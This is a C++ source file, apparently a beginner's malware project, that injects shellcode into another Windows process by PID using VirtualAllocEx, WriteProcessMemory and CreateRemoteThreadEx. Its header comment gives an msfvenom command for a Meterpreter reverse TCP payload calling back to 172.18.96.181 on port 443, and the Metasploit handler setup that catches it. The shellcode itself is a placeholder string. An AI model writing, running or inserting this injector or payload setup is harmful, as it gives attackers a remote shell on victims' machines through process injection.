/*
msfvenom --platform windows --arch x64 - p windows / x64 / meterpreter / reverse_tcp LHOST = 172.18.96.181 LPORT = 443 EXITFUNC = thread - f c --var - name = pooPoo
msf6 > use exploit / multi / handler
[*] Using configured payload generic / shell_reverse_tcp
msf6 exploit(multi / handler) > set lhost eth0
lhost = > eth0
msf6 exploit(multi / handler) > set lport 443
lport = > 443
msf6 exploit(multi / handler) > set payload windows / x64 / meterpreter / reverse_tcp
payload = > windows / x64 / meterpreter / reverse_tcp
msf6 exploit(multi / handler) > options
run - j
*/
#include <iostream>
#include <windows.h>
#include <stdio.h>

DWORD PID = 11;
HANDLE hProcess, hThread = NULL;   // Clean up
LPVOID rBuffer = NULL;

unsigned char pooPoo[] = "Your shellcode goes here!!!!"
int main(int argc, char* argv[])
{

    if (argc < 2) {
        printf("Nono work");
        return 0;
    }

    PID = atoi(argv[1]);
    printf("%ld\n", PID);

    // Get the handle for the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess == NULL) {
        printf("Couldn't open the process, error: %ld", GetLastError());
        return 0;
    }
    printf("Got handle for: \n\\---0x%p\n", hProcess);


    // I left this for me.
//  .\x64\Release\BasicMalware.exe 10080




    // Allocate bytes to the process memory (rBuffer is the adress where we will place the stuff)
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(pooPoo), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (rBuffer == 0) {
        printf("Bubu no buffer: %ld", GetLastError());
        return 0;
    }
    printf("Alocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", sizeof(pooPoo));


    // Write that memory into the process memory
    WriteProcessMemory(hProcess, rBuffer, pooPoo, sizeof(pooPoo), NULL);
    printf("we put the poopoo into the process\n");


    // Create a thread to run the added ' P A Y L O A D '
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, NULL);
    if (hThread == NULL) {
        printf("Couldn't create the thread, error: %ld", GetLastError());
        CloseHandle(hProcess);
        return 0;
    }

    printf("Got handle to thread: ---0x%p\n", hThread);

    printf("Waiting for thread to finish\n");// Here's when the thread is gonna keep running until our process actually dies =(
    WaitForSingleObject(hThread, INFINITE);
    printf("Thread finished executing\n");


    printf("closing handles...");
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("...DONE!");


    return EXIT_SUCCESS;  // gg
//
}



